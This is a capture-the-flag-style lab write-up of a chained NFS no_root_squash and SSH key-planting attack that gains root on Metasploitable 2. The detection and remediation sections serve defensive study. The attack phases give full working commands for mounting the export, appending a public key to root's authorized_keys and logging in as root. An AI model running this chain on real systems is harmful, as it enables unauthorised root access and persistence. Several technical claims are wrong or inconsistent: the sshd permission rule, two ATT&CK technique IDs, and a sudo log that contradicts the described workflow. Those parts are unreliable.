Port 2049: NFS no_root_squash → SSH Key Planting 


Target: Metasploitable 2 
Attacker: Kali Linux 
Lab Environment: Isolated VMware host-only network
CVSS: 8.8 (High) — Unauthenticated root access via chained NFS + SSH misconfiguration


Vulnerability Chain

Primary Misconfigurations


NFS Export: / exported with no_root_squash

Allows attacker UID 0 (root) on Kali to write as UID 0 on target
Normal behavior: NFS squashes root to nobody to prevent privilege escalation
Misconfiguration: no_root_squash explicitly trusts attacker's root identity



SSH authorized_keys Permissions: 644 (world-readable)

sshd refuses to trust authorized_keys if group/other can read it (security check)
Fix applied during exploitation: chmod 600 /root/.ssh/authorized_keys



SSH Legacy Algorithm Support: OpenSSH 4.7p1 uses deprecated ssh-rsa and ssh-dss

Modern SSH clients reject these by default
Workaround: explicit -o HostKeyAlgorithms=ssh-rsa + -o PubkeyAcceptedAlgorithms=ssh-rsa






Attack Workflow

Phase 1: Reconnaissance

bash# Mount NFS export
mkdir -p /mnt/nfs
mount -t nfs 192.168.75.130:/ /mnt/nfs
ls -la /mnt/nfs/root/.ssh/

Output: authorized_keys readable (644 permissions) — vulnerability confirmed.

Phase 2: Key Generation (Attacker Side)

bashssh-keygen -t rsa -b 2048 -f ~/.ssh/msf2_nfs_key -N ""
cat ~/.ssh/msf2_nfs_key.pub

Phase 3: Key Planting (via NFS Write)

bash# Append public key to root's authorized_keys via mounted NFS share
cat ~/.ssh/msf2_nfs_key.pub >> /mnt/nfs/root/.ssh/authorized_keys

Critical Step: This write occurs outside any SSH or root authentication.
Permission Check: /root/.ssh/authorized_keys still owns root:root, but world-readable.

Phase 4: Permission Remediation (On Target)

The initial SSH login attempt fails because sshd rejects world-readable authorized_keys.

Workaround: Attacker with sudo on Kali (or via NFS root squash bypass):

bashsudo chmod 600 /mnt/nfs/root/.ssh/authorized_keys

Or, if Kali user is already root via NFS:

bashchmod 600 /mnt/nfs/root/.ssh/authorized_keys

Phase 5: SSH Key-Based Root Login

bashssh -o HostKeyAlgorithms=ssh-rsa -o PubkeyAcceptedAlgorithms=ssh-rsa \
    -i ~/.ssh/msf2_nfs_key root@192.168.75.130

Result: Root shell prompt achieved without password.


Log Evidence

SSH Authentication Success (auth.log)

Jul  3 04:29:53 metasploitable sshd[5874]: Accepted publickey for root from 192.168.75.129 port 59876 ssh2
Jul  3 04:29:53 metasploitable sshd[5877]: pam_unix(sshd:session): session opened for user root by root(uid=0)

Key Indicators:


Accepted publickey — key-based auth (not password)
root — privileged user
192.168.75.129 — attacker IP
No password or keyboard-interactive in auth chain


File Permission Change (sudo/auditd)

Jul  3 04:25:15 metasploitable sudo: msfadmin : TTY=tty1 ; PWD=/home/msfadmin ; USER=root ; COMMAND=/bin/chmod 600 /root/.ssh/authorized_keys

Interpretation: Someone ran chmod 600 on authorized_keys via sudo — a preparation step for SSH key trust.


Detection Opportunities

Alert Triggers (High Confidence)


SSH Root Login via Public Key from Internal Non-Admin Source

Baseline: root SSH should only come from jump hosts or provisioning servers
Anomaly: Key-based root login from workstation/lab IP



File Modification: /root/.ssh/authorized_keys Size Change

Detect: Sudden growth in size (key appended)
Alert: Especially if preceding SSH login attempt fails, then succeeds after chmod



NFS Mount Activity + SSH Key Auth Within 5 Minutes

Behavioral: correlation between NFS mount and subsequent root SSH login
High fidelity: these are not usually concurrent in legitimate scenarios





Detection Gaps (Current Limitations)

Wazuh Agentless SSH Monitoring:


Polls /var/log/auth.log via SSH diff (ssh_generic_diff)
Gap: No visibility into SSH key file modifications (/root/.ssh/authorized_keys)
Gap: Cannot detect when the key was planted (only final auth success)
Remediation: Enable auditd or file integrity monitoring (FIM) on .ssh/ directory


Suricata Network IDS:


Captured SSH flow on port 22 (5 flows, 5 txns)
Gap: Zero alert rules fired on SSH public-key auth traffic
Gap: Cannot distinguish legitimate key auth from attacker-planted keys at network layer
Remediation: Custom Sigma rule to correlate NFS write + SSH auth anomalies



Attacker Mindset

Why this attack works:


NFS is trusted layer 3 protocol; firewalls often allow it between "trusted" networks
SSH public-key auth is correct security (better than passwords) — hard to flag as malicious without context
Key planting is persistent — survives reboot, doesn't require password re-entry, leaves minimal log footprint
Root squash is obscure config; most admins don't know it exists or its implications


Lateral Movement Value:


One-time setup; infinite reuse
No need to crack/guess passwords
Works across reboots (key is stored on disk)
Pairs with SSH tunneling for remote access



Remediation

Immediate (Tactical)

bash# On target: Remove attacker's public key
grep -v "worm@worm" /root/.ssh/authorized_keys > /tmp/authorized_keys.clean
mv /tmp/authorized_keys.clean /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chown root:root /root/.ssh/authorized_keys

Structural (Strategic)


NFS Export Hardening


bash   # /etc/exports — remove no_root_squash
   # Before:
   / *(rw,no_root_squash,insecure)
   # After:
   / *(rw,root_squash,secure)


SSH Key Monitoring


bash   # auditd rule to catch authorized_keys writes
   auditctl -w /root/.ssh/authorized_keys -p wa -k ssh_key_changes


Baseline SSH Public Keys


bash   find /root/.ssh /home/*/.ssh -name "authorized_keys" -exec sha256sum {} \; > /etc/ssh/authorized_keys.baseline
   # Daily verification: diff against baseline


Disable Root SSH (if possible)


bash   # sshd_config
   PermitRootLogin no


Sigma Rule Reference


ssh-root-pubkey-auth-anomaly: Detects Accepted publickey for root from unexpected sources
nfs-authorized-keys-write: Detects file modifications to SSH trust files via NFS mounts
nfs-no-root-squash-mount: Detects NFS mount attempts with no_root_squash flag active


Location: sigma-rules/nfs-ssh-keyplant-*.yml


Tools Used

ToolVersionPurposemount (util-linux)2.xNFS mountssh-keygenOpenSSH 7.4+RSA key generationsshOpenSSH 7.4+SSH client with legacy algorithm flagsWazuh4.7.0Agentless SSH log monitoringSuricata8.0.5Network IDS (zero alerts)


Timeline

TimeEventEvidence04:09:54Failed SSH password attempts (recon)sshd[5797]: Failed password for root04:25:15chmod 600 on authorized_keys via sudosudo: ... COMMAND=/bin/chmod 60004:29:53Successful SSH public-key auth as rootsshd[5874]: Accepted publickey for root


MITRE ATT&CK Mapping


T1098.004 — Modify SSH Authorized Keys (credential access)
T1021.004 — SSH (lateral movement)
T1021.003 — NFS Share Mounting (lateral movement)
T1547.014 — SSH Authorized Keys (persistence)



References


CIS Benchmarks: NFS Export Configuration
NIST SP 800-53: AC-3 Access Enforcement
Red Hat Security Guide: Securing NFS